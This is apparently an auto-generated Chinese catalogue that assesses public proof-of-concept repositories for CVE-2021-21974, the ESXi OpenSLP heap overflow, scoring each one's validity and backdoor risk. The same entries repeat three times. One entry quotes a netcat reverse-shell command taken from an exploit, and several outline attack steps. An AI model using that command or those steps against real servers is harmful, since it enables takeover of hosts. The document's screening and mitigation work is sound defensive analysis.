1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

